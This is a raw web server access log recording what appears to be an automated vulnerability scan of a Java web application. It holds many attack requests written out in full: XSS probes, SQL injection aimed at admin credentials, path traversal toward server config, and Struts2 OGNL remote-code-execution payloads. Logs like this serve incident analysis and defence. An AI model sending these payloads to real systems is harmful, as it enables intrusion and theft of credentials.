42.156.139.71 - - [09/Mar/2017:00:01:11 +0800] "GET /sxzn/foreground/browseMetadata.action;jsessionid=5463CCAB7B8A56CD3C769FB0C758653B HTTP/1.1" 200 26368
61.149.17.32 - - [09/Mar/2017:08:28:11 +0800] "GET /sxzn/foreground/browseMetadata.action?\" onmouseover=alert(8408) var=\"bad HTTP/1.1" 200 25926
61.149.17.32 - - [09/Mar/2017:08:28:11 +0800] "GET /sxzn/connections/ HTTP/1.1" 404 1117
61.149.17.32 - - [09/Mar/2017:08:28:11 +0800] "GET /sxzn/foreground/info.php HTTP/1.1" 404 1027
61.149.17.32 - - [09/Mar/2017:08:28:11 +0800] "GET /sxzn/foreground/browseMetadata.action?d-49747-p=%3Cscript%3Ealert%28/Hello%2C+WebRavor%21/%29%3C/script%3E HTTP/1.1" 200 25818
61.149.17.32 - - [09/Mar/2017:08:28:11 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/home/glassfish/glassfish4/glassfish/domains/domain1/config/ HTTP/1.1" 500 1718
61.149.17.32 - - [09/Mar/2017:08:28:11 +0800] "POST /sxzn/doSearch.action HTTP/1.1" 200 5869
61.149.17.32 - - [09/Mar/2017:08:28:11 +0800] "GET /sxzn/foreground/admin-console HTTP/1.1" 404 1120
61.149.17.32 - - [09/Mar/2017:08:28:11 +0800] "GET /sxzn/common/ HTTP/1.1" 404 1102
61.149.17.32 - - [09/Mar/2017:08:28:11 +0800] "GET /sxzn/foreground/viewMetadata.action?id=%25%27%20aNd%20126=125%20aNd%20%27%25%27=%27 HTTP/1.1" 404 1210
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/examples/servlets/servlet/SessionExample HTTP/1.1" 404 1123
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foreground/web-console HTTP/1.1" 404 1114
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/map/index.html HTTP/1.1" 404 217
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\\%27%20or%20mid=@`\\%27`%20/*!50000union*//*!50000select*/1%2c2%2c3%2c(select%20CONCAT(0x7c%2cuserid%2c0x7c%2cpwd)+from+`%23@__admin`%20limit+0%2c1)%2c5%2c6%2c7%2c8%2c9%23@`\\%27`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294 HTTP/1.1" 404 1129
61.149.17.32 - - [09/Mar/2017:08:28:11 +0800] "POST /sxzn/checkLogin.action HTTP/1.1" 200 7349
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foreground/administrators/ HTTP/1.1" 404 1159
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/login.action HTTP/1.1" 200 7254
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/sitemap/index.html HTTP/1.1" 404 221
61.149.17.32 - - [09/Mar/2017:08:28:11 +0800] "POST /sxzn/register.action HTTP/1.1" 200 20611
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/ HTTP/1.1" 500 1718
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "POST /sxzn/doSearch.action HTTP/1.1" 200 5869
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "POST /sxzn/foreground/viewMetadata.action HTTP/1.1" 404 1210
61.149.17.32 - - [09/Mar/2017:08:28:11 +0800] "GET /sxzn/register.action?debug=command&expression=%23_memberAccess[\"allowStaticMethodAccess\"]=true,@java.lang.Runtime@getRuntime() HTTP/1.1" 200 20611
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foreground/administrator/ HTTP/1.1" 404 1156
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/wzdt/index.html HTTP/1.1" 404 218
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/config-browser/actionNames.action?namespace=<script>alert(/SecDomainTest/)</script> HTTP/1.1" 404 1114
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foreground/system/ HTTP/1.1" 404 1135
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/Map.do HTTP/1.1" 404 988
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "POST /sxzn/checkLogin.action HTTP/1.1" 200 7349
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/struts2-showcase/config-browser/actionNames.action?namespace=<script>alert(/SecDomainTest/)</script> HTTP/1.1" 404 1114
61.149.17.32 - - [09/Mar/2017:08:28:11 +0800] "GET /sxzn/foreground/browseMetadata.action?d-49747-p=%5C0%5C%22%5C%27%3E%3CScRiPt%3Ealert%28/Hello%2C+WebRavor%21/%29%3B%3C/ScRiPt%3E HTTP/1.1" 200 25818
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foreground/console HTTP/1.1" 404 1102
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/Map.htm HTTP/1.1" 404 210
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foreground/viewMetadata.action?id=1 HTTP/1.1" 200 8939
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "POST /sxzn/doSearch.action HTTP/1.1" 404 1204
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/phpmyadmin/ HTTP/1.1" 500 1718
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/login.action HTTP/1.1" 200 7254
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "POST /sxzn/register.action HTTP/1.1" 200 20611
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/register.action? HTTP/1.1" 200 20611
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/Map.html HTTP/1.1" 404 211
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foreground/weblogin/ HTTP/1.1" 404 1141
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/login.jsp HTTP/1.1" 404 1102
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foreground/viewMetadata.action?id=-999%20OR%20126=126 HTTP/1.1" 404 1210
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/SiteMap.shtml HTTP/1.1" 404 1009
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foreground/work/ HTTP/1.1" 404 1129
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "POST /sxzn/checkLogin.action HTTP/1.1" 200 7349
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/admin.html HTTP/1.1" 404 240
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foreground/src/ HTTP/1.1" 404 1126
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/SiteMap.do HTTP/1.1" 404 1000
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "POST /sxzn/doSearch.action HTTP/1.1" 404 1204
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/admin/ HTTP/1.1" 500 1718
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/login.action?('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\\43x\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\\43x\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\\43x.getWriter().println(\"xwork_found\")')(d))&(i99)(('\\43x.getWriter().close()')(d)) HTTP/1.1" 200 7254
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "POST /sxzn/foreground/viewMetadata.action HTTP/1.1" 404 1210
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foreground/FCKeditor/editor/filemanager/upload/php/upload.php?Type=Media HTTP/1.1" 404 1153
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/SiteMap.html HTTP/1.1" 404 215
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foreground/browseMetadata.action?d-49747-p=%22+style%3D%22XSS:expression%28alert%28/Hello%2C+WebRavor%21/%29%29%22 HTTP/1.1" 200 25818
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/.svn/ HTTP/1.1" 500 1718
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "POST /sxzn/register.action HTTP/1.1" 200 20611
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "POST /sxzn/checkLogin.action HTTP/1.1" 200 7349
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foreground/fckeditor/editor/filemanager/upload/php/upload.php?Type=Media HTTP/1.1" 404 1153
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/ConversionReport.txt HTTP/1.1" 404 1030
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/register.action? HTTP/1.1" 200 20611
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "POST /sxzn/doSearch.action HTTP/1.1" 404 1204
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foreground/viewMetadata.action?id=-999%20OR%20126=125 HTTP/1.1" 404 1210
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/.svn/entries HTTP/1.1" 404 1102
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foreground/FCKeditor/editor/filemanager/browser/default/browser.html?Connector=connectors/jsp/connector HTTP/1.1" 404 271
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/Output-Build.txt HTTP/1.1" 404 1018
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/login.action?debug=command&expression=%23_memberAccess[\"allowStaticMethodAccess\"]=true,@java.lang.Runtime@getRuntime() HTTP/1.1" 200 7254
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/server-info HTTP/1.1" 404 1114
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foreground/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=%2F HTTP/1.1" 404 1108
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/WS_FTP.log HTTP/1.1" 404 1000
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "POST /sxzn/doSearch.action HTTP/1.1" 404 1204
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/server-status HTTP/1.1" 404 1120
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "POST /sxzn/foreground/viewMetadata.action HTTP/1.1" 404 1210
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "POST /sxzn/checkLogin.action HTTP/1.1" 200 7349
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foreground/fckeditor/editor/filemanager/browser/default/browser.html?Connector=connectors/jsp/connector HTTP/1.1" 404 271
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/logs/errors.log HTTP/1.1" 404 1015
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "POST /sxzn/register.action HTTP/1.1" 200 20611
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/Web.config HTTP/1.1" 404 1000
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/login.action? HTTP/1.1" 200 7254
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foreground/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=%2F HTTP/1.1" 404 1108
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/webadmin/ HTTP/1.1" 500 1718
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foreground/browseMetadata.action?d-49747-p=%22%3E%3C/iframe%3E%3Cscript%3Ealert%28/Hello%2C+WebRavor%21/%29%3B%3C/script%3E HTTP/1.1" 200 25818
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/register.action? HTTP/1.1" 200 20611
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "POST /sxzn/doSearch.action HTTP/1.1" 404 1204
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foreground/FCKeditor/editor/filemanager/browser/default/browser.html?type=&connector=connectors/aspx/connector.aspx HTTP/1.1" 404 271
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/inf.php HTTP/1.1" 404 1096
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/web.xml HTTP/1.1" 404 991
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foreground/FCKeditor/editor/filemanager/browser/default/browser.html?Type=&Connector=connectors/asp/connector.asp HTTP/1.1" 404 271
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/info.php HTTP/1.1" 404 1099
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/App.config HTTP/1.1" 404 1000
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foreground/viewMetadata.action?id=1 HTTP/1.1" 200 8939
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "POST /sxzn/checkLogin.action HTTP/1.1" 200 7386
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/admin-console HTTP/1.1" 404 1120
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/config.web HTTP/1.1" 404 1000
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/login.action? HTTP/1.1" 200 7254
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foreground/test.do HTTP/1.1" 404 1024
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "POST /sxzn/register.action HTTP/1.1" 200 20611
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "POST /sxzn/doSearch.action HTTP/1.1" 404 1204
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foreground/viewMetadata.action?id=-999%27%20or%20%27235%27=%27235%27%20or%20%271%27=%272 HTTP/1.1" 404 1210
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/web-console HTTP/1.1" 404 1114
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foreground/test.htm HTTP/1.1" 404 222
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/register.action?('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(d)(('@java.lang.Thread@sleep(8000)')(d)) HTTP/1.1" 200 20611
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "POST /sxzn/checkLogin.action HTTP/1.1" 200 7349
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foreground/test.html HTTP/1.1" 404 223
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/administrators/ HTTP/1.1" 500 1718
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "POST  HTTP/1.1" 400 226
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "POST /sxzn/foreground/viewMetadata.action HTTP/1.1" 404 1210
61.149.17.32 - - [09/Mar/2017:08:28:12 +0800] "GET /sxzn/foreground/browseMetadata.action?d-49747-p=%3Cscript%3Ealert%28/Hello%2C+WebRavor%21/%29%3B%3C/script%3E HTTP/1.1" 200 25818
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/login.action? HTTP/1.1" 200 7254
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foreground/test.jsp HTTP/1.1" 404 1027
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "POST /sxzn/doSearch.action HTTP/1.1" 404 1204
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/administrator/ HTTP/1.1" 500 1718
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "POST /sxzn/checkLogin.action HTTP/1.1" 200 7349
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/ HTTP/1.1" 200 18576
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "POST /sxzn/register.action HTTP/1.1" 200 20611
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foreground/test.php HTTP/1.1" 404 1027
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/system/ HTTP/1.1" 500 1718
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foreground/viewMetadata.action?id=-999%27%20or%20%271%27=%272%27%20or%20%271%27=%272 HTTP/1.1" 404 1210
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "POST  HTTP/1.1" 400 226
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/checkLogin.action?user.username=2024-12-20&user.password=2024-12-20&exPassword=2024-12-20%20aNd%20126=126 HTTP/1.1" 200 7349
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foreground/test.asp HTTP/1.1" 404 1027
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "POST /sxzn/doSearch.action HTTP/1.1" 404 1204
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/console HTTP/1.1" 404 1102
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/register.action HTTP/1.1" 200 20611
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foreground/inc/conn.inc HTTP/1.1" 404 1039
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "POST /sxzn/foreground/viewMetadata.action HTTP/1.1" 404 1210
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/login.action HTTP/1.1" 200 7254
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/weblogin/ HTTP/1.1" 500 1718
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "POST /sxzn/checkLogin.action HTTP/1.1" 200 7349
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foreground/browseMetadata.action?d-49747-p=%22%3E%3C/iframe%3E%3Cimg+src%3D%5C%22%23%5C%22/%2A%2A/onerror%3Dalert%28Hello%2C+WebRavor%21/%29+width%3D100%3E HTTP/1.1" 200 25818
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foreground/editor/filemanager HTTP/1.1" 404 1114
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "POST /sxzn/doSearch.action HTTP/1.1" 404 1204
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "POST /sxzn/register.action HTTP/1.1" 200 20611
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/work/ HTTP/1.1" 500 1718
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foreground/editor/ HTTP/1.1" 404 1135
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/src/ HTTP/1.1" 500 1718
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/ HTTP/1.1" 200 18576
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foreground/eWebEditor/db/ewebeditor.mdb HTTP/1.1" 404 1087
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foreground/viewMetadata.action?('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\\43x\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\\43x\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\\43x.getWriter().println(\"xwork_found\")')(d))&(i99)(('\\43x.getWriter().close()')(d)) HTTP/1.1" 404 1210
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/register.action?class[%27classLoader%27][%27jarPath%27]=1 HTTP/1.1" 200 20611
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/checkLogin.action?user.username=2024-12-20&user.password=2024-12-20&exPassword=2024-12-20%20aNd%20126=125 HTTP/1.1" 200 7349
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/FCKeditor/editor/filemanager/upload/php/upload.php?Type=Media HTTP/1.1" 404 1225
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/login.action?class[%27classLoader%27][%27jarPath%27]=1 HTTP/1.1" 200 7254
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "POST /sxzn/doSearch.action HTTP/1.1" 404 1204
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foreground/eWebEditor/Admin_Login.asp HTTP/1.1" 404 1081
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/checkReg.action?user.username= HTTP/1.1" 200 1508
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/fckeditor/editor/filemanager/upload/php/upload.php?Type=Media HTTP/1.1" 404 1225
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "POST /sxzn/register.action HTTP/1.1" 200 16368
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foreground/viewMetadata.action?debug=command&expression=%23_memberAccess[\"allowStaticMethodAccess\"]=true,@java.lang.Runtime@getRuntime() HTTP/1.1" 404 1210
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foreground/upload/ HTTP/1.1" 404 1135
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/FCKeditor/editor/filemanager/browser/default/browser.html?Connector=connectors/jsp/connector HTTP/1.1" 404 287
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foreground/browseMetadata.action?d-49747-p=%27%22%3E%3Cimg+src%3D%5C%22%23%5C%22/%2A%2A/onerror%3Dalert%28Hello%2C+WebRavor%21/%29+width%3D100%3E HTTP/1.1" 200 25818
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "POST /sxzn/checkLogin.action HTTP/1.1" 200 7349
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foreground/login/ HTTP/1.1" 404 1132
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/?('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\\43x\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\\43x\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\\43x.getWriter().println(\"xwork_found\")')(d))&(i99)(('\\43x.getWriter().close()')(d)) HTTP/1.1" 200 18576
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=%2F HTTP/1.1" 404 1108
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/register.action?class[%27classLoader%27][%27resources%27]=1 HTTP/1.1" 200 20611
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/login.action?class[%27classLoader%27][%27resources%27]=1 HTTP/1.1" 200 7254
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/checkReg.action?user.username= HTTP/1.1" 200 1508
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foreground/iisadmin/ HTTP/1.1" 404 1141
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "POST /sxzn/doSearch.action HTTP/1.1" 404 1204
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/fckeditor/editor/filemanager/browser/default/browser.html?Connector=connectors/jsp/connector HTTP/1.1" 404 287
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "POST /sxzn/register.action HTTP/1.1" 200 16368
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foreground/viewMetadata.action? HTTP/1.1" 404 1210
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "POST /sxzn/checkLogin.action HTTP/1.1" 200 7349
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foreground/doc/ HTTP/1.1" 404 1126
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=%2F HTTP/1.1" 404 1108
